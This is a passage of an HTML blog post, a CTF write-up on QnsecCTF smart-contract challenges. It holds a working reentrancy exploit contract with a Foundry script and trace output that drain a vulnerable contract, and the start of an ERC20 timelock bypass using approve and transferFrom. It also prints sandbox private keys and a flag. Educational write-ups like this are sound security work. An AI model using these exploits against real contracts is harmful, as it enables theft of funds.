@@ -1,0 +1,1145 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Qnsec Blockchain Challenges</title>
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <style>
+        /* --- FONTS --- */
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code&family=IBM+Plex+Mono:wght@400;600&display=swap');
+
+        /* --- GENERAL BODY STYLES --- */
+        body {
+            background-color: #121212;
+            color: #E0E0E0;
+            font-family: 'IBM Plex Mono', monospace;
+            margin: 0;
+            padding: 0;
+            font-size: 1.1rem;
+            line-height: 1.7;
+        }
+
+        /* --- KEY CHANGE: HEADER LAYOUT --- */
+        header {
+            padding: 1rem;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .header-container {
+            max-width: 960px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            /* Space between name and nav links */
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            /* Space between social icons */
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Fira Code', monospace;
+            font-size: 1.5rem;
+            /* Adjusted size for new layout */
+            font-weight: 600;
+            color: #FFFFFF;
+        }
+
+        nav {
+            display: flex;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+
+        nav a {
+            color: #CCCCCC;
+            text-decoration: none;
+            font-size: 1rem;
+            padding: 0.25rem 0;
+            transition: color 0.2s ease-in-out;
+            font-family: 'Fira Code', monospace;
+        }
+
+        nav a:hover {
+            color: #ff4d4d;
+            text-decoration: underline;
+        }
+
+        /* --- KEY ADDITION: SOCIAL ICON STYLES --- */
+        .social-icon svg {
+            width: 22px;
+            height: 22px;
+            fill: #CCCCCC;
+            transition: fill 0.2s ease-in-out;
+        }
+
+        .social-icon:hover svg {
+            fill: #ff4d4d;
+        }
+
+        /* --- HAMBURGER MENU BUTTON (Mobile Only) --- */
+        .menu-toggle {
+            display: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0.5rem;
+            z-index: 1000;
+        }
+
+        .menu-toggle span {
+            display: block;
+            width: 25px;
+            height: 3px;
+            background-color: #CCCCCC;
+            margin: 5px 0;
+            transition: all 0.3s ease;
+            border-radius: 2px;
+        }
+
+        .menu-toggle.active span:nth-child(1) {
+            transform: rotate(45deg) translate(8px, 8px);
+        }
+
+        .menu-toggle.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .menu-toggle.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -6px);
+        }
+
+        /* --- MOBILE RESPONSIVE STYLES --- */
+        @media (max-width: 768px) {
+            .header-container {
+                flex-wrap: wrap;
+                position: relative;
+            }
+
+            .menu-toggle {
+                display: block;
+                order: 2;
+            }
+
+            .header-left {
+                width: 100%;
+                justify-content: space-between;
+                margin-bottom: 0;
+            }
+
+            header h1 {
+                font-size: 1.3rem;
+            }
+
+            nav {
+                display: none;
+                flex-direction: column;
+                width: 100%;
+                background-color: #1a1a1a;
+                padding: 1rem 0;
+                border-radius: 8px;
+                margin-top: 1rem;
+                animation: slideDown 0.3s ease;
+            }
+
+            nav.active {
+                display: flex;
+            }
+
+            nav a {
+                padding: 0.75rem 1rem;
+                font-size: 1.1rem;
+                border-bottom: 1px solid #2a2a2a;
+            }
+
+            nav a:last-child {
+                border-bottom: none;
+            }
+
+            .header-right {
+                width: 100%;
+                justify-content: center;
+                gap: 1.5rem;
+                margin-top: 1rem;
+                padding-top: 1rem;
+                border-top: 1px solid #2a2a2a;
+            }
+
+            @keyframes slideDown {
+                from {
+                    opacity: 0;
+                    transform: translateY(-10px);
+                }
+
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
+            }
+        }
+
+        /* --- MAIN CONTENT --- */
+        main {
+            /* --- KEY CHANGE: Page extended left and right --- */
+            max-width: 960px;
+            margin: 3rem auto;
+            padding: 0 1rem;
+        }
+
+        a {
+            color: #FFFFFF;
+            text-decoration: underline;
+            font-weight: 600;
+            transition: color 0.2s ease-in-out;
+        }
+
+        a:hover {
+            color: #ff4d4d;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4 {
+            font-family: 'Fira Code', monospace;
+            color: #FFFFFF;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            margin-top: 2.5rem;
+        }
+
+        p {
+            margin-bottom: 1.2rem;
+        }
+
+        /* --- STYLES FOR CODE BLOCKS AND COPY BUTTON --- */
+        .code-container {
+            position: relative;
+        }
+
+        pre {
+            background-color: #1E1E1E;
+            border: 1px solid #333333;
+            padding: 1.5rem;
+            padding-top: 3rem;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 1rem;
+            border-radius: 5px;
+            margin: 1.5rem 0;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+        }
+
+        .copy-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #333;
+            color: #E0E0E0;
+            border: 1px solid #555;
+            border-radius: 5px;
+            padding: 0.3rem 0.6rem;
+            font-family: 'IBM Plex Mono', monospace;
+            cursor: pointer;
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        .copy-button:hover {
+            background-color: #444;
+            color: #FFFFFF;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="header-container">
+            <div class="header-left">
+                <h1><a href="/" style="text-decoration:none; color: inherit;">Nithin Kumar</a></h1>
+
+                <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+            </div>
+
+            <nav id="mainNav">
+                <!-- <a href="/">Home</a> -->
+                <a href="/writeups">Writeups</a>
+                <a href="/analysis">Analysis</a>
+                <a href="/audits">Audits</a>
+                <a href="/projects">Projects</a>
+                <a href="/contact">Contact</a>
+                <a href="/tags">Tags</a>
+            </nav>
+
+
+            <div class="header-right">
+                <a href="https://github.com/BLOCK-PROGRAMR" class="social-icon" title="GitHub">
+                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12" />
+                    </svg>
+                </a>
+                <a href="https://www.linkedin.com/in/5C4T3R" class="social-icon" title="LinkedIn">
+                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.15 0-2.08-.926-2.08-2.065 0-1.138.93-2.066 2.08-2.066 1.153 0 2.08.928 2.08 2.066 0 1.139-.928 2.065-2.08 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.225 0z" />
+                    </svg>
+                </a>
+                <a href="https://x.com/0x_Scater" class="social-icon" title="X (Twitter)">
+                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" />
+                    </svg>
+                </a>
+                <a href="mailto:0xscater@gmail.com" class="social-icon" title="Email">
+                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6zm-2 0l-8 5-8-5h16zm0 12H4V8l8 5 8-5v10z" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Qnsec Blockchain Challenges</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2025-10-19T00:00:00+00:00" itemprop="datePublished">Oct 19, 2025
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>I recently participated in QnsecCTF with my team, <strong>HackerTroupe</strong>. As usual, I solved the smart contract challenges.</p>
+
+<h3 id="challenge-1">Challenge 1:</h3>
+
+<p><strong>Description</strong>:
+They provided two contracts:</p>
+
+<p><strong>Challenge.sol</strong>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.0;
+
+import "src/CallMeBack.sol";
+
+contract Challenge {
+    address public immutable PLAYER;
+    CallMeBack public immutable CONTRACT;
+
+    bool private solved;
+
+    constructor(address player, address _contract) public {
+        PLAYER = player;
+        
+        CONTRACT = CallMeBack(payable(_contract));
+    }
+
+    function solve() external {
+        require(address(PLAYER).balance &gt; 10 ether, "NOT_ENOUGH_ETHER");
+        solved = true;
+    }
+
+    function isSolved() external view returns (bool) {
+        return solved;
+    }
+}
+
+</code></pre>
+<p><strong>CallmeBack.sol</strong>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.6.0;
+
+contract CallMeBack {
+
+    mapping(address =&gt; uint256) public balances;
+
+    function donate() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] &gt;= _amount) {
+            (bool success,) = msg.sender.call{value: _amount}("");
+            require(success, "ETH transfer failed");
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+</code></pre>
+
+<p>Also, they provided nc 161.97.155.116 6969 port which is used to get a private blockchain to solve the challenge.</p>
+
+<p><strong>Analysis</strong>:
+This is a classic reentrancy attack because of checks-effects-interaction violation. If you call outside contracts, first update the value then call the function, otherwise it causes reentrancy!</p>
+
+<p><strong>Steps to solve</strong>:</p>
+
+<ul>
+  <li>Connect to the port and deploy the blockchain:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ nc 161.97.155.116 6969
+
+# Press 1
+
+ ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
+██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
+██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
+██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
+╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
+ ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     
+
+[callmeback] A random degen has appeared!
+[callmeback] 1 - Launch a new instance
+[callmeback] 2 - Kill your instance
+[callmeback] 3 - Get the flag
+[callmeback] Action? 1
+
+[callmeback] Your ticket: aa40f1a9f367bc64268139a2614ada39
+
+[callmeback] Creating private blockchain...
+[callmeback] Deploying challenge.. (please be patient, this can take a while)
+
+[callmeback] Your private blockchain has been set up,
+[callmeback] it will automatically terminate in 15.0 minutes!
+
+[callmeback] RPC Endpoints:
+[callmeback]     - http://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main
+[callmeback]     - ws://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main/ws
+
+[callmeback] The Player private key:         0x665a52bbf260dfab3abdef5d5f4a0892b2d5eddc3d9bd56470b831e25b40d8a0
+[callmeback] The Challenge contract address: 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A
+
+</code></pre>
+
+<ul>
+  <li>Get the CallMeBack contract address. It is stored onchain, you can get it by using foundry commands:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ source .env
+
+# Get CallMeBack address
+CALLMEBACK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)
+echo "CallMeBack: $CALLMEBACK"
+
+# Add to .env
+echo "export CALLMEBACK=\"$CALLMEBACK\"" &gt;&gt; .env
+source .env
+</code></pre>
+
+<p>Output:</p>
+<pre><code class="language-Bash">CallMeBack: 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2
+</code></pre>
+
+<p>Then you can see the .env file:</p>
+
+<pre><code class="language-Bash">export RPC_URL="http://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main"
+export PRIVATE_KEY="0x665a52bbf260dfab3abdef5d5f4a0892b2d5eddc3d9bd56470b831e25b40d8a0"
+export CHALLENGE="0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A"
+export CALLMEBACK="0xb3CEA24519bcF7da2859A864a624428D1dCF7af2"
+
+</code></pre>
+<p>After that, check the CallMeBack balance, then go for the exploit:</p>
+
+<pre><code class="language-Bash"># Check CallMeBack balance
+cast balance $CALLMEBACK --rpc-url $RPC_URL --ether
+
+# Check Player address
+PLAYER=$(cast wallet address --private-key $PRIVATE_KEY)
+echo "Player: $PLAYER"
+
+# Check Player balance
+cast balance $PLAYER --rpc-url $RPC_URL --ether
+</code></pre>
+
+<p>Output:</p>
+<pre><code class="language-Bash">1.000000000000000000
+Player: 0xd201156e618Bcd1874dCFb01Eebe652b05C87252
+10.000000000000000000
+</code></pre>
+
+<ul>
+  <li>Now write <code class="language-plaintext highlighter-rouge">src/Exploit.sol</code> to exploit the CallMeBack contract:</li>
+</ul>
+
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface ICallMeBack {
+    function donate() external payable;
+    function withdraw(uint256 _amount) external;
+    function balanceOf(address _who) external view returns (uint256);
+}
+
+contract Exploit {
+    ICallMeBack public target;
+    uint256 public amount;
+    
+    constructor(address _target) public {
+        target = ICallMeBack(_target);
+    }
+    
+    function attack() external payable {
+        require(msg.value &gt;= 1 ether, "Need at least 1 ETH");
+        amount = msg.value;
+        
+        target.donate{value: amount}();
+        target.withdraw(amount);
+    }
+    
+    receive() external payable {
+        if (address(target).balance &gt;= amount) {
+            target.withdraw(amount);
+        }
+    }
+    
+    function withdraw() external {
+        msg.sender.transfer(address(this).balance);
+    }
+}
+</code></pre>
+
+<ul>
+  <li>This is the script contract (<code class="language-plaintext highlighter-rouge">script/Solve.s.sol</code>) to attack the CallMeBack.sol:</li>
+</ul>
+
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "forge-std/Script.sol";
+import "../src/Exploit.sol";
+
+contract SolveScript is Script {
+    function run() external {
+        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
+        address callMeBack = vm.envAddress("CALLMEBACK");
+        address challenge = vm.envAddress("CHALLENGE");
+        
+        vm.startBroadcast(deployerPrivateKey);
+        
+        // Deploy exploit
+        Exploit exploit = new Exploit(callMeBack);
+        console.log("Exploit deployed at:", address(exploit));
+        
+        // Attack with 1 ETH
+        exploit.attack{value: 1 ether}();
+        console.log("Attack executed");
+        
+        // Withdraw stolen funds
+        exploit.withdraw();
+        console.log("Funds withdrawn to player");
+        
+        // Call solve
+        (bool success,) = challenge.call(abi.encodeWithSignature("solve()"));
+        require(success, "Solve failed");
+        console.log("Challenge solved!");
+        
+        vm.stopBroadcast();
+    }
+}
+</code></pre>
+
+<ul>
+  <li>Now run this command to understand how the attack works:
+    <pre><code class="language-Bash">forge script script/Solve.s.sol:SolveScript \
+--rpc-url $RPC_URL \
+--broadcast \
+--legacy \
+-vvvv
+</code></pre>
+  </li>
+  <li>Result:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ forge script script/Solve.s.sol:SolveScript \
+  --rpc-url $RPC_URL \
+  --broadcast \
+  --legacy \
+  -vvvv
+[⠆] Compiling...
+No files changed, compilation skipped
+Traces:
+  [397516] SolveScript::run()
+    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::envAddress("CALLMEBACK") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::startBroadcast(&lt;pk&gt;)
+    │   └─ ← [Return]
+    ├─ [222929] → new Exploit@0xD9f928f593C059A6849731E5e86443aEeBaA1375
+    │   └─ ← [Return] 1002 bytes of code
+    ├─ [0] console::log("Exploit deployed at:", Exploit: [0xD9f928f593C059A6849731E5e86443aEeBaA1375]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [91752] Exploit::attack{value: 1000000000000000000}()
+    │   ├─ [22385] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::donate{value: 1000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─ [36735] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
+    │   │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
+    │   │   │   ├─ [8116] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
+    │   │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attack executed") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [7027] Exploit::withdraw()
+    │   ├─ [0] 0xd201156e618Bcd1874dCFb01Eebe652b05C87252::fallback{value: 2000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Funds withdrawn to player") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [22462] 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A::solve()
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Challenge solved!") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+
+Script ran successfully.
+
+== Logs ==
+  Exploit deployed at: 0xD9f928f593C059A6849731E5e86443aEeBaA1375
+  Attack executed
+  Funds withdrawn to player
+  Challenge solved!
+
+## Setting up 1 EVM.
+==========================
+Simulated On-chain Traces:
+
+  [222929] → new Exploit@0xD9f928f593C059A6849731E5e86443aEeBaA1375
+    └─ ← [Return] 1002 bytes of code
+
+  [93752] Exploit::attack{value: 1000000000000000000}()
+    ├─ [22385] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::donate{value: 1000000000000000000}()
+    │   └─ ← [Stop]
+    ├─ [36735] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
+    │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
+    │   │   ├─ [8116] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
+    │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+  [7027] Exploit::withdraw()
+    ├─ [0] 0xd201156e618Bcd1874dCFb01Eebe652b05C87252::fallback{value: 2000000000000000000}()
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+  [22462] 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A::solve()
+    └─ ← [Stop]
+
+
+==========================
+
+Chain 31337
+
+Estimated gas price: 1.673006184 gwei
+
+Estimated total gas used for script: 614085
+
+Estimated amount required: 0.00102736800250164 ETH
+
+==========================
+
+##### anvil-hardhat
+✅  [Success] Hash: 0xc7198436788802fdc90d36591ff72bb08ce2ae40009a419334dbe6e52646bb61
+Block: 5
+Paid: 0.000046996416714744 ETH (28091 gas * 1.673006184 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x887a15a5c7969d0899f1b0b33e78519d3b7f55abd82a179264c64f2031261fa2
+Contract Address: 0xD9f928f593C059A6849731E5e86443aEeBaA1375
+Block: 4
+Paid: 0.000491326783110936 ETH (293679 gas * 1.673006184 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x5d0f61180b0d89298b0d070495c32d48ac94b01c1f4f56bcf14307199eb22f18
+Block: 5
+Paid: 0.000158795054960544 ETH (94916 gas * 1.673006184 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0xe0b77ffe40b48c3dd8d5f4cf7c5d604ce09391a34a523e021dc569e01969234b
+Block: 6
+Paid: 0.000072819267164784 ETH (43526 gas * 1.673006184 gwei)
+
+✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000769937521951008 ETH (460212 gas * avg 1.673006184 gwei)
+                                                                                              
+
+==========================
+
+ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.
+
+Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/broadcast/Solve.s.sol/31337/run-latest.json
+
+Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/cache/Solve.s.sol/31337/run-latest.json
+</code></pre>
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ # Check if solved
+cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL
+
+# Should return: true
+true     
+
+### Challenge successfully completed!
+</code></pre>
+
+<ul>
+  <li>To get Flag:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ nc 161.97.155.116 6969
+
+ ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
+██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
+██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
+██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
+╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
+ ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     
+
+[callmeback] You dare challenge me?
+[callmeback] 1 - Launch a new instance
+[callmeback] 2 - Kill your instance
+[callmeback] 3 - Get the flag
+[callmeback] Action? 3
+
+[callmeback] What is your ticket? aa40f1a9f367bc64268139a2614ada39
+[callmeback] Congratulations! Here is your flag: QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}
+</code></pre>
+
+<h4 id="challenge-2">Challenge 2:</h4>
+
+<p><strong>Description</strong>:
+This is a very simple challenge. It’s a basic ERC20 mechanism to exploit the contract.
+They provided two contracts:
+<strong>Challenge.sol</strong>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "src/Timelock.sol";
+
+contract Challenge {
+    address public immutable PLAYER;
+    Timelock public immutable CONTRACT;
+
+    bool private solved;
+
+    constructor(address player, address _contract) public {
+        PLAYER = player;
+        
+        CONTRACT = Timelock(payable(_contract));
+    }
+
+    function solve() external {
+        require(CONTRACT.balanceOf(PLAYER) == 0, "COINS_NOT_SPENT");
+        solved = true;
+    }
+
+    function isSolved() external view returns (bool) {
+        return solved;
+    }
+}
+
+</code></pre>
+<p><strong>TimeLock.sol</strong>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract Timelock is ERC20 {
+    uint256 public timeLock = block.timestamp + 10 * 365 days;
+    uint256 public INITIAL_SUPPLY;
+    address public player;
+
+    constructor(address _player) ERC20("NaughtCoin", "0x0") {
+        player = _player;
+        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
+        _mint(player, INITIAL_SUPPLY);
+        emit Transfer(address(0), player, INITIAL_SUPPLY);
+    }
+
+    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
+        super.transfer(_to, _value);
+    }
+
+    // Prevent the initial owner from transferring tokens until the timelock has passed
+    modifier lockTokens() {
+        if (msg.sender == player) {
+            require(block.timestamp &gt; timeLock);
+            _;
+        }
+    }
+}
+</code></pre>
+
+<p><strong>Analysis</strong>:
+After understanding these two contracts, this is a very basic challenge to exploit. In ERC20, you can actually transfer tokens using the <code class="language-plaintext highlighter-rouge">transferFrom</code> function. Before this, you just approve tokens. If you approve them, you can get the tokens anytime. But here, you can only get the tokens after a certain time period passes. This is the core fault—you can bypass it using <code class="language-plaintext highlighter-rouge">transferFrom</code> and <code class="language-plaintext highlighter-rouge">approve</code> in ERC20 tokens.</p>
+
+<h4 id="steps-to-solve">Steps to solve:</h4>
+
+<ul>
+  <li>Use nc 161.97.155.116 6970 to get the private blockchain:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ nc 161.97.155.116 6970
+# Press 1
+
+ ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
+██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
+██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
+██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
+╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
+ ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     
+
+[timelock] Welcome anon!
+[timelock] 1 - Launch a new instance
+[timelock] 2 - Kill your instance
+[timelock] 3 - Get the flag
+[timelock] Action? 1
+
+[timelock] Your ticket: 5e1412cd7083b4b49f31098c9b322b16
+
+[timelock] Creating private blockchain...
+[timelock] Deploying challenge.. (please be patient, this can take a while)
+
+[timelock] Your private blockchain has been set up,
+[timelock] it will automatically terminate in 15.0 minutes!
+
+[timelock] RPC Endpoints:
+[timelock]     - http://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main
+[timelock]     - ws://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main/ws
+
+[timelock] The Player private key:         0xaabd6bc6c80b62c8e486de2285d9f7a9d59995694a73ed98481e51f0e0016414
+[timelock] The Challenge contract address: 0xf00F7a89E5da858edB45744e4464E468897c1e1e
+</code></pre>
+
+<ul>
+  <li>After that, find the Timelock contract address which is stored onchain. You can get the address by using foundry cast command:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cd ~/SCATERLABs/CTFs/Block1/bloc2
+source .env
+
+TIMELOCK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)
+echo "export TIMELOCK=\"$TIMELOCK\"" &gt;&gt; .env
+source .env
+</code></pre>
+
+<p>After that, the .env file looks like:</p>
+
+<pre><code class="language-Bash">export RPC_URL="http://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main"
+export PRIVATE_KEY="0xaabd6bc6c80b62c8e486de2285d9f7a9d59995694a73ed98481e51f0e0016414"
+export CHALLENGE="0xf00F7a89E5da858edB45744e4464E468897c1e1e"
+export TIMELOCK="0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6"
+</code></pre>
+
+<ul>
+  <li>Now write the script file directly to exploit this:</li>
+</ul>
+
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "../src/Timelock.sol";
+import "../src/Challenge.sol";
+
+contract SolveScript is Script {
+    function run() external {
+        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
+        address timelock = vm.envAddress("TIMELOCK");
+        address challenge = vm.envAddress("CHALLENGE");
+        
